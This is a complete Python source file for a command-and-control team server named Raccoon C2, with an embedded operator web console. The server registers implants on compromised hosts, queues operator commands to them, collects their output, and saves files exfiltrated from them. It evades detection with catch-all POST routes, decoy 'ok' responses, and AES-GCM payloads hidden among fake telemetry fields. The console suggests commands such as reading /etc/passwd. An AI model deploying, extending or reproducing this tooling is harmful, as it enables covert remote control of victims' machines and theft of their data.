#!/usr/bin/env python3
"""
Raccoon C2 Team Server
Adapted from boku7/venom architecture, protocol-matched to the Raccoon beacon.
AES-256-GCM encrypted comms, catch-all routing for evasive URLs,
embedded operator GUI with TrashPandaPaws aesthetic.

Usage:
  python server.py --port 443 --ssl
  python server.py --port 8443 --key <base64-key>
  python server.py --derive-key "https://c2.example.com/api/v1/beacon:c2.example.com"
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import secrets
import ssl
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from flask import Flask, request, jsonify, send_from_directory, Response

logger = logging.getLogger("raccoon.c2.server")

# ── Shared constants (must match beacon.py) ──

_PAYLOAD_FIELDS = [
    "session_token", "auth_hash", "state_key", "nonce", "validation",
    "api_key", "request_token", "cipher_text", "payload_data", "signature",
    "trace_id", "correlation_id", "request_id", "transaction_id",
]

AGENT_NAMES = [
    "bandit", "burglar", "prowler", "scavenger", "ringtail",
    "masked", "nocturnal", "sneaky", "whiskers", "dumpster",
    "shadow", "lurker", "thief", "forager", "trickster",
    "rascal", "scamp", "pirate", "raider", "ghost",
]

import random as _rng


def _decoy_fields(n: int) -> dict:
    pool = {
        "cpu_pct": lambda: round(_rng.uniform(2, 90), 1),
        "mem_mb": lambda: _rng.randint(64, 8192),
        "disk_pct": lambda: round(_rng.uniform(10, 95), 1),
        "request_count": lambda: _rng.randint(100, 99999),
        "session_count": lambda: _rng.randint(1, 5000),
        "latency_ms": lambda: _rng.randint(1, 500),
        "cache_hit_pct": lambda: round(_rng.uniform(50, 99.9), 1),
        "thread_count": lambda: _rng.randint(4, 128),
    }
    keys = _rng.sample(list(pool.keys()), min(n, len(pool)))
    return {k: pool[k]() for k in keys}


# ── Crypto (mirrors beacon._encrypt / _decrypt) ──


class ServerCrypto:
    def __init__(self, key: bytes):
        self._key = key
        self._aesgcm = AESGCM(key)

    def encrypt(self, data: dict) -> str:
        plaintext = json.dumps(data, separators=(",", ":")).encode()
        nonce = os.urandom(12)
        ct = self._aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ct).decode()

    def decrypt(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        nonce, ct = raw[:12], raw[12:]
        plaintext = self._aesgcm.decrypt(nonce, ct, None)
        return json.loads(plaintext)

    def unwrap(self, body: dict) -> Optional[dict]:
        for field in _PAYLOAD_FIELDS:
            if field in body:
                try:
                    return self.decrypt(body[field])
                except Exception:
                    continue
        for v in body.values():
            if isinstance(v, str) and len(v) > 32:
                try:
                    return self.decrypt(v)
                except Exception:
                    continue
        return None

    def wrap(self, data: dict) -> dict:
        encrypted = self.encrypt(data)
        field = _rng.choice(_PAYLOAD_FIELDS)
        payload = {field: encrypted}
        payload.update(_decoy_fields(_rng.randint(3, 7)))
        return dict(sorted(payload.items()))


# ── Data store ──

agents: dict[str, dict] = {}
task_queues: dict[str, list] = {}
results: dict[str, dict] = {}
history: dict[str, list] = {}
_name_counter = 0


def _assign_name() -> str:
    global _name_counter
    name = AGENT_NAMES[_name_counter % len(AGENT_NAMES)]
    idx = _name_counter // len(AGENT_NAMES)
    _name_counter += 1
    return f"raccoon-{name}-{idx}" if idx > 0 else f"raccoon-{name}"


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _save_state(data_dir: Path):
    state = {
        "agents": agents,
        "history": history,
        "name_counter": _name_counter,
    }
    (data_dir / "state.json").write_text(json.dumps(state, indent=2))


def _load_state(data_dir: Path):
    global agents, history, _name_counter
    state_file = data_dir / "state.json"
    if state_file.exists():
        state = json.loads(state_file.read_text())
        agents.update(state.get("agents", {}))
        history.update(state.get("history", {}))
        _name_counter = state.get("name_counter", 0)
        for aid in agents:
            task_queues.setdefault(aid, [])


# ── Flask app ──


def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path) -> Flask:
    app = Flask(__name__)
    static_dir = Path(__file__).parent / "static"

    # ── Operator auth ──

    def check_auth():
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            return auth[7:] == operator_token
        return False

    def require_auth(f):
        from functools import wraps

        @wraps(f)
        def wrapper(*args, **kwargs):
            if not check_auth():
                return jsonify({"error": "unauthorized"}), 401
            return f(*args, **kwargs)

        return wrapper

    # ── Static files ──

    @app.route("/static/<path:filename>")
    def serve_static(filename):
        return send_from_directory(str(static_dir), filename)

    @app.route("/logo.png")
    def serve_logo():
        logo = Path(__file__).parent.parent.parent / "static" / "trashpanda_logo.png"
        if logo.exists():
            return send_from_directory(str(logo.parent), logo.name)
        return "", 404

    # ── Operator GUI ──

    @app.route("/")
    def index():
        return _OPERATOR_HTML.replace("{{TOKEN}}", operator_token)

    # ── Operator API ──

    @app.route("/api/agents", methods=["GET"])
    @require_auth
    def api_agents():
        agent_list = []
        now = time.time()
        for aid, info in agents.items():
            last = info.get("_last_seen_ts", 0)
            interval = info.get("interval", 300)
            if now - last < interval * 2:
                status = "online"
            elif now - last < interval * 5:
                status = "stale"
            else:
                status = "offline"
            agent_list.append({**info, "status": status})
        return jsonify(agent_list)

    @app.route("/api/agents/<agent_id>", methods=["GET"])
    @require_auth
    def api_agent_detail(agent_id):
        if agent_id not in agents:
            return jsonify({"error": "not found"}), 404
        return jsonify(agents[agent_id])

    @app.route("/api/agents/<agent_id>/task", methods=["POST"])
    @require_auth
    def api_create_task(agent_id):
        if agent_id not in agents:
            return jsonify({"error": "not found"}), 404
        data = request.json
        task = {
            "id": str(uuid.uuid4())[:8],
            "cmd": data.get("cmd", ""),
            "args": data.get("args", ""),
            "data": data.get("data", ""),
            "timeout": data.get("timeout", 300),
            "queued": _now(),
            "status": "pending",
        }
        task_queues.setdefault(agent_id, []).append(task)
        history.setdefault(agent_id, []).append({
            "task_id": task["id"],
            "cmd": task["cmd"],
            "args": task["args"],
            "timestamp": task["queued"],
            "status": "pending",
            "output": None,
        })
        return jsonify(task)

    @app.route("/api/agents/<agent_id>/history", methods=["GET"])
    @require_auth
    def api_history(agent_id):
        return jsonify(history.get(agent_id, []))

    @app.route("/api/tasks/<task_id>", methods=["GET"])
    @require_auth
    def api_task_result(task_id):
        if task_id in results:
            return jsonify(results[task_id])
        return jsonify({"status": "pending"})

    # ── Beacon catch-all (handles any POST path) ──

    @app.route("/", methods=["POST"])
    @app.route("/<path:path>", methods=["POST"])
    def beacon_handler(path=""):
        try:
            body = request.get_json(silent=True)
            if not body:
                return _fake_response()

            payload = crypto.unwrap(body)
            if payload is None:
                return _fake_response()

            action = payload.get("action", "")

            if action == "register":
                return _handle_register(payload, crypto)
            elif action == "beacon":
                return _handle_beacon(payload, crypto)
            elif action == "result":
                return _handle_result(payload, crypto, data_dir)
            else:
                return _fake_response()

        except Exception as e:
            logger.debug("Beacon handler error: %s", e)
            return _fake_response()

    return app


def _fake_response():
    return jsonify({"status": "ok", "version": "2.1.0"}), 200


def _handle_register(payload: dict, crypto: ServerCrypto):
    implant_id = payload.get("id", "")

    for aid, info in agents.items():
        if info.get("id") == implant_id:
            info.update({
                "hostname": payload.get("hostname", ""),
                "os": payload.get("os", ""),
                "arch": payload.get("arch", ""),
                "user": payload.get("user", ""),
                "pid": payload.get("pid", 0),
                "interval": payload.get("interval", 300),
                "last_seen": _now(),
                "_last_seen_ts": time.time(),
            })
            resp = crypto.wrap({"success": True, "agent_id": aid})
            logger.info("Agent re-registered: %s (%s)", aid, payload.get("hostname"))
            return jsonify(resp)

    agent_id = _assign_name()
    agents[agent_id] = {
        "id": implant_id,
        "agent_id": agent_id,
        "hostname": payload.get("hostname", ""),
        "os": payload.get("os", ""),
        "arch": payload.get("arch", ""),
        "user": payload.get("user", ""),
        "pid": payload.get("pid", 0),
        "interval": payload.get("interval", 300),
        "uptime": payload.get("uptime", 0),
        "registered": _now(),
        "last_seen": _now(),
        "_last_seen_ts": time.time(),
    }
    task_queues[agent_id] = []
    history[agent_id] = []

    logger.info("New agent registered: %s (%s @ %s)",
                agent_id, payload.get("user"), payload.get("hostname"))

    resp = crypto.wrap({"success": True, "agent_id": agent_id})
    return jsonify(resp)


def _handle_beacon(payload: dict, crypto: ServerCrypto):
    agent_id = payload.get("agent_id")
    if not agent_id:
        for aid, info in agents.items():
            if info.get("id") == payload.get("id"):
                agent_id = aid
                break

    if agent_id and agent_id in agents:
        agents[agent_id]["last_seen"] = _now()
        agents[agent_id]["_last_seen_ts"] = time.time()
        agents[agent_id]["uptime"] = payload.get("uptime", 0)
        agents[agent_id]["interval"] = payload.get("interval",
                                                    agents[agent_id].get("interval", 300))

        queue = task_queues.get(agent_id, [])
        if queue:
            task = queue.pop(0)
            task["status"] = "dispatched"
            task["dispatched"] = _now()
            logger.info("Dispatching task %s (%s) to %s",
                        task["id"], task["cmd"], agent_id)
            resp = crypto.wrap(task)
            return jsonify(resp)

    return jsonify(crypto.wrap({}))


def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
    task_id = payload.get("task_id", "")
    agent_id = payload.get("agent_id", "")
    status = payload.get("status", "unknown")
    output = payload.get("output", "")
    data = payload.get("data")

    results[task_id] = {
        "task_id": task_id,
        "agent_id": agent_id,
        "status": status,
        "output": output,
        "data": data,
        "received": _now(),
    }

    if agent_id in history:
        for entry in history[agent_id]:
            if entry.get("task_id") == task_id:
                entry["status"] = status
                entry["output"] = output
                break

    if agent_id in agents:
        agents[agent_id]["last_seen"] = _now()
        agents[agent_id]["_last_seen_ts"] = time.time()

    logger.info("Result from %s task %s: %s (%d bytes)",
                agent_id, task_id, status, len(output))

    _save_state(data_dir)

    if data and data.get("data"):
        dl_dir = data_dir / "downloads" / agent_id
        dl_dir.mkdir(parents=True, exist_ok=True)
        filename = data.get("filename", f"{task_id}.bin")
        (dl_dir / filename).write_bytes(base64.b64decode(data["data"]))
        logger.info("Downloaded file saved: %s/%s", agent_id, filename)

    return jsonify(crypto.wrap({"ack": True}))


# ── Operator HTML (embedded) ──

_OPERATOR_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Raccoon C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#070910;--surface:rgba(10,14,22,0.94);--surface2:rgba(15,20,30,0.88);
  --red:#ff1a1a;--red-dim:#991111;--red-glow:rgba(255,26,26,0.4);
  --green:#33ff33;--green-dim:#1a8c1a;--yellow:#ffcc00;--orange:#ff6600;
  --text:#d0d4dc;--text2:#6b7080;--border:rgba(255,26,26,0.15);
  --mono:'Cascadia Code','Fira Code','JetBrains Mono','Courier New',monospace;
  --sans:system-ui,-apple-system,sans-serif;
}
html,body{height:100%;overflow:hidden;font-family:var(--sans);color:var(--text);background:var(--bg)}
body{
  background-image:url('/static/wallpaper.jpg');
  background-size:cover;background-position:center;background-attachment:fixed;
}
body::after{
  content:'';position:fixed;inset:0;
  background:linear-gradient(180deg,rgba(7,9,16,0.82) 0%,rgba(7,9,16,0.95) 100%);
  pointer-events:none;z-index:0;
}
#app{position:relative;z-index:1;display:flex;flex-direction:column;height:100vh}

/* Header */
header{
  display:flex;align-items:center;gap:14px;padding:10px 20px;
  background:var(--surface);border-bottom:1px solid var(--border);
  box-shadow:0 2px 20px rgba(255,26,26,0.08);
}
header img{width:38px;height:38px;border-radius:50%;border:2px solid var(--red-dim)}
header h1{font-size:18px;font-weight:700;color:var(--red);text-shadow:0 0 15px var(--red-glow);letter-spacing:0.04em}
header .subtitle{font-size:11px;color:var(--text2);margin-left:4px}
header .spacer{flex:1}
header .status-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green)}
header .info{font-size:11px;color:var(--text2)}

/* Layout */
.main{display:flex;flex:1;overflow:hidden}

/* Sidebar */
.sidebar{
  width:260px;min-width:200px;background:var(--surface);
  border-right:1px solid var(--border);display:flex;flex-direction:column;
}
.sidebar h2{
  font-size:11px;text-transform:uppercase;letter-spacing:0.08em;
  color:var(--text2);padding:14px 16px 8px;
}
.agent-list{flex:1;overflow-y:auto;padding:0 8px 8px}
.agent-card{
  padding:10px 12px;margin-bottom:4px;border-radius:6px;cursor:pointer;
  border:1px solid transparent;transition:all 0.15s;
}
.agent-card:hover{background:var(--surface2);border-color:var(--border)}
.agent-card.active{background:rgba(255,26,26,0.08);border-color:var(--red-dim)}
.agent-card .name{font-size:13px;font-weight:600;color:var(--text)}
.agent-card .meta{font-size:11px;color:var(--text2);margin-top:2px}
.agent-card .dot{
  display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px;vertical-align:middle;
}
.dot.online{background:var(--green);box-shadow:0 0 4px var(--green)}
.dot.stale{background:var(--yellow);box-shadow:0 0 4px var(--yellow)}
.dot.offline{background:#555}

/* Content */
.content{flex:1;display:flex;flex-direction:column;overflow:hidden}
.agent-header{
  padding:12px 20px;background:var(--surface);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:16px;
}
.agent-header .agent-name{font-size:15px;font-weight:700;color:var(--red)}
.agent-header .tag{
  font-size:10px;padding:2px 8px;border-radius:3px;
  background:rgba(255,26,26,0.1);color:var(--red);border:1px solid var(--red-dim);
}
.agent-header .detail{font-size:12px;color:var(--text2)}

/* Terminal */
.terminal-wrap{flex:1;display:flex;flex-direction:column;overflow:hidden;padding:8px 12px}
.terminal{
  flex:1;overflow-y:auto;padding:12px 16px;
  background:rgba(0,0,0,0.6);border-radius:8px;border:1px solid var(--border);
  font-family:var(--mono);font-size:13px;line-height:1.6;
}
.terminal::-webkit-scrollbar{width:6px}
.terminal::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:3px}
.t-system{color:var(--text2);font-style:italic}
.t-cmd{color:var(--red)}
.t-cmd::before{content:'❯ ';color:var(--red-dim)}
.t-output{color:var(--green);white-space:pre-wrap;word-break:break-all}
.t-error{color:#ff6666;white-space:pre-wrap}
.t-info{color:var(--yellow)}
.t-pending{color:var(--text2);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}

/* Input */
.input-bar{
  display:flex;gap:8px;padding:8px 0;align-items:center;
}
.input-bar .prompt{color:var(--red);font-family:var(--mono);font-size:14px;font-weight:700;white-space:nowrap}
.input-bar input{
  flex:1;background:rgba(0,0,0,0.5);border:1px solid var(--border);
  border-radius:6px;padding:10px 14px;color:var(--text);
  font-family:var(--mono);font-size:13px;outline:none;
}
.input-bar input:focus{border-color:var(--red-dim);box-shadow:0 0 8px rgba(255,26,26,0.15)}
.input-bar input::placeholder{color:var(--text2)}
.input-bar button{
  padding:10px 18px;background:var(--red-dim);color:#fff;border:none;
  border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;
  font-family:var(--sans);transition:background 0.15s;
}
.input-bar button:hover{background:var(--red)}

/* Empty state */
.empty{
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  flex:1;gap:16px;color:var(--text2);
}
.empty img{width:120px;opacity:0.3}
.empty p{font-size:14px}

/* Scrollbar */
.agent-list::-webkit-scrollbar{width:4px}
.agent-list::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
</style>
</head>
<body>
<div id="app">
  <header>
    <img src="/logo.png" alt="Logo" onerror="this.style.display='none'">
    <h1>RACCOON C2</h1>
    <span class="subtitle">Team Server</span>
    <div class="spacer"></div>
    <span class="status-dot"></span>
    <span class="info" id="server-info">Listening</span>
  </header>
  <div class="main">
    <div class="sidebar">
      <h2>Agents</h2>
      <div class="agent-list" id="agent-list"></div>
    </div>
    <div class="content" id="content">
      <div class="empty">
        <img src="/logo.png" alt="" onerror="this.style.display='none'">
        <p>Waiting for agents to connect...</p>
        <p style="font-size:12px;color:#444">Beacon traffic accepted on any POST path</p>
      </div>
    </div>
  </div>
</div>

<script>
const TOKEN = "{{TOKEN}}";
const H = {"Authorization":"Bearer "+TOKEN,"Content-Type":"application/json"};
let selectedAgent = null;
let pollTimer = null;
let cmdHistory = [];
let cmdIdx = -1;

async function api(path, opts){
  const r = await fetch(path, {headers:H, ...opts});
  return r.json();
}

async function refreshAgents(){
  const agents = await api("/api/agents");
  const list = document.getElementById("agent-list");
  list.innerHTML = "";
  agents.sort((a,b) => {
    const order = {online:0,stale:1,offline:2};
    return (order[a.status]||9) - (order[b.status]||9);
  });
  agents.forEach(a => {
    const card = document.createElement("div");
    card.className = "agent-card" + (selectedAgent===a.agent_id?" active":"");
    card.onclick = () => selectAgent(a.agent_id);
    card.innerHTML = `
      <div class="name"><span class="dot ${a.status}"></span>${esc(a.agent_id)}</div>
      <div class="meta">${esc(a.user||'?')}@${esc(a.hostname||'?')} · ${esc(a.os||'?')}</div>
      <div class="meta">${esc(a.arch||'')} · last: ${timeSince(a.last_seen)}</div>
    `;
    list.appendChild(card);
  });
  document.getElementById("server-info").textContent = agents.length+" agent"+(agents.length!==1?"s":"");
}

function selectAgent(id){
  selectedAgent = id;
  if(pollTimer) clearInterval(pollTimer);
  renderAgentView(id);
  pollTimer = setInterval(() => pollHistory(id), 2000);
  refreshAgents();
}

async function renderAgentView(id){
  const info = await api("/api/agents/"+id);
  const hist = await api("/api/agents/"+id+"/history");
  const content = document.getElementById("content");
  content.innerHTML = `
    <div class="agent-header">
      <span class="agent-name">${esc(id)}</span>
      <span class="tag">${esc(info.arch||'?')}</span>
      <span class="tag">${esc(info.os||'?')}</span>
      <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${info.pid||'?'} · up ${formatUptime(info.uptime||0)}</span>
    </div>
    <div class="terminal-wrap">
      <div class="terminal" id="terminal"></div>
      <div class="input-bar">
        <span class="prompt">${esc(id)} ❯</span>
        <input id="cmd-input" placeholder="shell whoami / ls /tmp / cat /etc/passwd / sleep 60 20 / kill" autocomplete="off">
        <button onclick="sendCmd()">Send</button>
      </div>
    </div>
  `;
  const term = document.getElementById("terminal");
  term.innerHTML = '<div class="t-system">Session opened with '+esc(id)+'</div>';
  hist.forEach(h => renderHistoryEntry(h));
  term.scrollTop = term.scrollHeight;

  const input = document.getElementById("cmd-input");
  input.addEventListener("keydown", e => {
    if(e.key==="Enter"){sendCmd();e.preventDefault()}
    else if(e.key==="ArrowUp"){e.preventDefault();if(cmdIdx<cmdHistory.length-1){cmdIdx++;input.value=cmdHistory[cmdHistory.length-1-cmdIdx]||""}}
    else if(e.key==="ArrowDown"){e.preventDefault();if(cmdIdx>0){cmdIdx--;input.value=cmdHistory[cmdHistory.length-1-cmdIdx]||""}else{cmdIdx=-1;input.value=""}}
  });
  input.focus();
}

function renderHistoryEntry(h){
  const term = document.getElementById("terminal");
  if(!term) return;
  const full = h.cmd + (h.args ? " " + h.args : "");
  let html = '<div class="t-cmd">'+esc(full)+'</div>';
  if(h.status==="pending"||h.status===null){
    html += '<div class="t-pending">⏳ waiting for agent...</div>';
  } else if(h.status==="ok"){
    html += '<div class="t-output">'+esc(h.output||"(no output)")+'</div>';
  } else {
    html += '<div class="t-error">'+esc(h.output||"(error)")+'</div>';
  }
  term.innerHTML += html;
}

async function sendCmd(){
  const input = document.getElementById("cmd-input");
  const raw = input.value.trim();
  if(!raw || !selectedAgent) return;
  input.value = "";
  cmdHistory.push(raw);
  cmdIdx = -1;

  const parts = raw.split(/\s+/);
  const cmd = parts[0];
  let args = parts.slice(1).join(" ");
  let data = "";

  if(cmd==="upload" && parts.length>=2){
    const fileInput = document.createElement("input");
    fileInput.type = "file";
    fileInput.onchange = async () => {
      const file = fileInput.files[0];
      if(!file) return;
      const buf = await file.arrayBuffer();
      const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
      await api("/api/agents/"+selectedAgent+"/task",{method:"POST",body:JSON.stringify({cmd,args,data:b64})});
      pollHistory(selectedAgent);
    };
    fileInput.click();
    return;
  }

  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST",
    body:JSON.stringify({cmd,args,data})
  });
  pollHistory(selectedAgent);
}

async function pollHistory(id){
  if(id !== selectedAgent) return;
  const hist = await api("/api/agents/"+id+"/history");
  const term = document.getElementById("terminal");
  if(!term) return;
  term.innerHTML = '<div class="t-system">Session opened with '+esc(id)+'</div>';
  hist.forEach(h => renderHistoryEntry(h));
  term.scrollTop = term.scrollHeight;
  refreshAgents();
}

function esc(s){
  if(s==null) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function timeSince(iso){
  if(!iso) return "never";
  const d = (Date.now()-new Date(iso).getTime())/1000;
  if(d<60) return Math.floor(d)+"s ago";
  if(d<3600) return Math.floor(d/60)+"m ago";
  if(d<86400) return Math.floor(d/3600)+"h ago";
  return Math.floor(d/86400)+"d ago";
}

function formatUptime(s){
  if(s<60) return s+"s";
  if(s<3600) return Math.floor(s/60)+"m";
  if(s<86400) return Math.floor(s/3600)+"h "+Math.floor((s%3600)/60)+"m";
  return Math.floor(s/86400)+"d "+Math.floor((s%86400)/3600)+"h";
}

setInterval(refreshAgents, 3000);
refreshAgents();
</script>
</body>
</html>
"""


# ── CLI ──

def main():
    parser = argparse.ArgumentParser(
        description="Raccoon C2 Team Server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--host", default="0.0.0.0", help="Listen address")
    parser.add_argument("--port", type=int, default=8443, help="Listen port")
    parser.add_argument("--key", help="Base64-encoded 32-byte AES-GCM key")
    parser.add_argument(
        "--derive-key",
        help="Derive key from 'callback_url:dns_domain' (must match beacon config)",
    )
    parser.add_argument("--ssl", action="store_true", help="Enable HTTPS (self-signed)")
    parser.add_argument("--cert", help="SSL certificate file")
    parser.add_argument("--certkey", help="SSL private key file")
    parser.add_argument("--token", help="Fixed operator token (default: random)")
    parser.add_argument(
        "--data-dir", default=str(Path.home() / ".raccoon-c2"),
        help="Data directory for state persistence",
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s %(message)s",
    )

    if args.key:
        key = base64.b64decode(args.key)
    elif args.derive_key:
        parts = args.derive_key
        key = hashlib.sha256(parts.encode()).digest()
    else:
        key = hashlib.sha256(b":").digest()
        logger.warning("No encryption key specified — using default derived key")
        logger.warning("Use --key or --derive-key for production")

    crypto = ServerCrypto(key)

    operator_token = args.token or secrets.token_urlsafe(24)
    data_dir = Path(args.data_dir)
    data_dir.mkdir(parents=True, exist_ok=True)

    _load_state(data_dir)

    app = create_app(crypto, operator_token, data_dir)

    print()
    print("=" * 60)
    print("  🦝 Raccoon C2 Team Server")
    print("=" * 60)
    print(f"  Listen:   {'https' if args.ssl else 'http'}://{args.host}:{args.port}")
    print(f"  Token:    {operator_token}")
    print(f"  Data:     {data_dir}")
    print(f"  Key:      {'explicit' if args.key else 'derived' if args.derive_key else 'DEFAULT (insecure!)'}")
    print("=" * 60)
    print()

    ssl_ctx = None
    if args.ssl:
        if args.cert and args.certkey:
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_ctx.load_cert_chain(args.cert, args.certkey)
        else:
            ssl_ctx = "adhoc"
            logger.info("Using self-signed certificate (install pyopenssl: pip install pyopenssl)")

    app.run(
        host=args.host,
        port=args.port,
        ssl_context=ssl_ctx,
        debug=False,
        threaded=True,
    )


if __name__ == "__main__":
    main()
